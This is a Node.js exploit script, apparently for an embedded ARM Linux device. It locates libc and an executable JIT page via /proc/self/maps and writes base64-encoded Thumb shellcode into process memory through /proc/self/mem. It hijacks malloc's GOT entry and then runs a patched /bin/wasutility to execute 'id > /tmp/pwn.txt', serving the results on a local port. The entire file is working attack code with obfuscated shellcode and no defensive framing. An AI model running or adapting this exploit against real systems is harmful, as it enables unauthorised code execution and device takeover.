(function() {
  'use strict';
  var fs   = require('fs');
  var http = require('http');
  var cp   = require('child_process');
  var PROBE = '/home/owner/share/tmp/sdk_tools/tbprobe44h.txt';
  var PORT  = 8133;
  var GOT_OFFSET = 0x143014;
  var WAS_PATH   = '/bin/wasutility';
  var WAS_OFFSET = 0x7e4b;
  var PWN_FILE   = '/tmp/pwn.txt';
  var DC_WAIT_MS = 35000;

  function w(s) { try { fs.appendFileSync(PROBE, s + '\n'); } catch(e) {} }

  // Shellcode_v4 (496 bytes) — 1-byte patch from v3: ADR offset fix in parent path.
  // Parent path's ADD.W R0,PC,#imm had imm=0x1b4 (aligned-PC formula) but 32-bit
  // ADD.W uses raw PC, so the correct imm is 0x1b2. Byte[0x14] patched 0xb4→0xb2.
  // Now open("/proc/self/mem") succeeds → GOT is restored → no fork-flood.
  var SC_B64 =
    'LenwT0/wAgcA3wAoPNAcTBxND/KyEE/wAgFP8AACT/AFBwDfBkYwRilGT/AA' +
    'Ak/wEwcA34GwAJQwRmlGT/AEAk/wBAcA3wGwMEZP8AYHAN9P8AAAT/AgAU/w' +
    'AwJP8CIDb/AABE/wAAUwtE/wwAcA3wKwvejwjwC/r/MAgK/zAIAAAAAAAAAA' +
    'AA/yLBBP8AABT/AAAk/wBQcA34BGT/AAAEzy5HHA8gABT/ABAk/wAgNERk/w' +
    'AAUwtE/wwAcA3wKwgUZARk/wBgcA3z+gT/ACAU/wAAJP8AUHAN+CRk/wAABP' +
    '8AABwPIBAU/wAwJP8CIDb/AABE/wAAUwtE/wwAcA3wKwg0ZP8AAEwPIBBFxE' +
    'QfYAcMDyBQAhRk/wAAJP8AADT/AABSC0T/B4BwDfAbAAKBTRSvIgFsDyBwZI' +
    'Rkzy5HHA8gABT/AEAk/w3AcA3wE+89FP8AAAT/ABBwDfSvIgFsDyBwZH9ktl' +
    'TURQRilGT/AAAk/wEwcA31BGHKFP8AECT/AEBwDfAT7v0U/wAAQQtA/yRgQQ' +
    'tA/yPwQQtAakELQFoGlGT/AAAk/wCwcA30/wAgBP8AEHAN8vYmluL3dhc3V0' +
    'aWxpdHkAL3Byb2Mvc2VsZi9tZW0ALWUAaWQgPiAvdG1wL3B3bi50eHQA4AAA' +
    'vw==';

  try { fs.writeFileSync(PROBE, 'step1:start\n'); } catch(e) {}

  var maps_str, libcBase = 0, jitPage = 0, jitSz = 0;
  try { maps_str = fs.readFileSync('/proc/self/maps', 'utf8'); } catch(e) { w('FAIL:maps'); return; }

  maps_str.split('\n').forEach(function(line) {
    if (!libcBase && line.indexOf('libc-2.24.so') !== -1) {
      var m = line.match(/^([0-9a-f]+)-/); if (m) libcBase = parseInt(m[1], 16);
    }
    var rwx = line.match(/^([0-9a-f]+)-([0-9a-f]+) rwxp/);
    if (rwx) { var sz = parseInt(rwx[2],16)-parseInt(rwx[1],16); if (sz>jitSz){jitSz=sz;jitPage=parseInt(rwx[1],16);} }
  });
  var gotAddr = libcBase + GOT_OFFSET;
  w('step2:libc=0x'+libcBase.toString(16)+' jit=0x'+jitPage.toString(16)+' jitSz='+jitSz+' got=0x'+gotAddr.toString(16));

  if (!libcBase || !jitPage || jitSz < 0x200) { w('FAIL:no_addrs jitSz=' + jitSz); return; }

  var wasByte = -1;
  try { wasByte = fs.readFileSync(WAS_PATH)[WAS_OFFSET]; } catch(e) {}
  w('step3:wasByte=0x' + (wasByte & 0xff).toString(16));

  if (wasByte === 0xe0) {
    w('step3a:ALREADY_PATCHED — skipping DC, exec directly');
    cp.exec(WAS_PATH + ' -e "id > ' + PWN_FILE + '"', {timeout: 8000}, function(e) {
      var pwn = 'not_found'; try { pwn = fs.readFileSync(PWN_FILE, 'utf8').trim(); } catch(re) {}
      var body = fs.readFileSync(PROBE,'utf8') + 'exec_e=' + (e?e.code:'ok') + ' pwn=' + pwn + '\n=== END ===\n';
      fs.writeFileSync(PROBE, body);
      http.createServer(function(r,s){s.end(body);}).listen(PORT,'127.0.0.1').on('error',function(){});
      setInterval(function(){},60000);
    });
    return;
  }

  var memfd = fs.openSync('/proc/self/mem', 'r+');
  var ob = new Buffer(4);
  fs.readSync(memfd, ob, 0, 4, gotAddr);
  var origMalloc = ob.readUInt32LE(0);
  w('step4:origMalloc=0x' + origMalloc.toString(16));

  var SC_BIN = new Buffer(SC_B64, 'base64');
  SC_BIN[0x80] = (origMalloc>>>0)&0xff;  SC_BIN[0x81] = (origMalloc>>>8)&0xff;
  SC_BIN[0x82] = (origMalloc>>>16)&0xff; SC_BIN[0x83] = (origMalloc>>>24)&0xff;
  SC_BIN[0x84] = (gotAddr>>>0)&0xff;     SC_BIN[0x85] = (gotAddr>>>8)&0xff;
  SC_BIN[0x86] = (gotAddr>>>16)&0xff;    SC_BIN[0x87] = (gotAddr>>>24)&0xff;
  w('step5:sc_patched len=' + SC_BIN.length);

  var scAddr = jitPage + 0x1000;
  var written = fs.writeSync(memfd, SC_BIN, 0, SC_BIN.length, scAddr);
  w('step6:sc_written written=' + written + ' scAddr=0x' + scAddr.toString(16));

  var verify = new Buffer(4);
  fs.readSync(memfd, verify, 0, 4, scAddr);
  // first 4 bytes of v4: same as v3 (push instruction unchanged)
  w('step7:sc_verify=' + verify.toString('hex') + ' expect=2de9f04f');

  // Also verify the patched byte at sc[0x14]
  var vb = new Buffer(1);
  fs.readSync(memfd, vb, 0, 1, scAddr + 0x14);
  w('step7b:adr_imm_byte=0x' + vb[0].toString(16) + ' expect=0xb2');

  var thumbTarget = (scAddr + 1) >>> 0;
  var gBuf = new Buffer(4);
  gBuf.writeUInt32LE(thumbTarget, 0);
  fs.writeSync(memfd, gBuf, 0, 4, gotAddr);
  fs.closeSync(memfd);
  w('step8:got_overwritten thumb=0x' + thumbTarget.toString(16));

  w('step9:firing');
  var _t = new Buffer(16);
  w('step10:trigger_returned');

  setTimeout(function() {
    try {
      var m2 = fs.openSync('/proc/self/mem', 'r+');
      var r2 = new Buffer(4);
      fs.readSync(m2, r2, 0, 4, gotAddr);
      var gotAfter = r2.readUInt32LE(0) >>> 0;
      w('step11:got_after=0x' + gotAfter.toString(16) +
        (gotAfter === (origMalloc>>>0) ? ' RESTORED_OK' : ' NOT_RESTORED'));
      fs.closeSync(m2);
    } catch(e) { w('step11:got_read_err:' + e.message); }

    var wasB2 = -1;
    try { wasB2 = fs.readFileSync(WAS_PATH)[WAS_OFFSET]; } catch(e) {}
    w('step11b:wasByte_now=0x' + (wasB2 & 0xff).toString(16));

    cp.exec(WAS_PATH + ' -e "id > ' + PWN_FILE + '"', {timeout: 8000}, function(e) {
      var pwn = 'not_found'; try { pwn = fs.readFileSync(PWN_FILE, 'utf8').trim(); } catch(re) {}
      var body = fs.readFileSync(PROBE, 'utf8') + 'step12:exec_e=' + (e?e.code:'ok') + ' pwn=[' + pwn + ']\n=== END ===\n';
      fs.writeFileSync(PROBE, body);
      var srv = http.createServer(function(req, res) { res.end(body); });
      srv.listen(PORT, '127.0.0.1'); srv.on('error', function(){});
      setInterval(function(){}, 60000);
    });
  }, DC_WAIT_MS);
})();
